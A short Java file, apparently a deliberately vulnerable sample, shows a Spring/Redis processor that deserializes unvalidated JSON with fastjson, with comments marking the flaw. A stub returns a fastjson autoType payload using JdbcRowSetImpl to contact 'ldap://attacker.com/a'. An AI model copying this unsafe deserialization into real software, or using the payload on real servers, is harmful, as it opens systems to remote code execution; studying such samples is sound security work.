import java.io.Serializable;
import java.util.List;
import java.util.Map;
import org.springframework.data.redis.core.RedisTemplate;
import com.alibaba.fastjson.JSON;

// 高抽象建模接口
interface DataProcessor {
    void processMetadata(String datasetId, byte[] metadata);
}

// 大数据处理基类
abstract class BigDataHandler implements DataProcessor {
    protected final RedisTemplate<String, Object> redisTemplate;
    
    protected BigDataHandler(RedisTemplate<String, Object> redisTemplate) {
        this.redisTemplate = redisTemplate;
    }
    
    protected void setColumnComment(String columnKey, String rawJson) {
        // 漏洞点：直接反序列化未经验证的JSON输入
        Role role = JSON.parseObject(rawJson, Role.class);
        redisTemplate.opsForValue().set("column:comment:" + columnKey, role);
    }
}

// Redis处理器实现
class RedisDataProcessor extends BigDataHandler {
    
    public RedisDataProcessor(RedisTemplate<String, Object> redisTemplate) {
        super(redisTemplate);
    }

    @Override
    public void processMetadata(String datasetId, byte[] metadata) {
        // 模拟从Excel解析的元数据
        Map<String, String> parsed = parseExcelMetadata(metadata);
        
        // 将角色依赖注入到Redis
        parsed.forEach((key, value) -> {
            // 攻击面：role-dependencies属性包含恶意JSON
            if (key.contains("role-dependencies")) {
                setColumnComment(key, value);
            }
        });
    }
    
    private Map<String, String> parseExcelMetadata(byte[] data) {
        // 简化实现
        return Map.of("role-dependencies:malicious", 
            "{\\"@type\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"ldap://attacker.com/a\\",\\"autoCommit\\":true}");
    }
}

// 角色类
class Role implements Serializable {
    private String name;
    private List<String> dependencies;
    // getters/setters
    
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    
    public List<String> getDependencies() { return dependencies; }
    public void setDependencies(List<String> dependencies) { 
        this.dependencies = dependencies; 
    }
}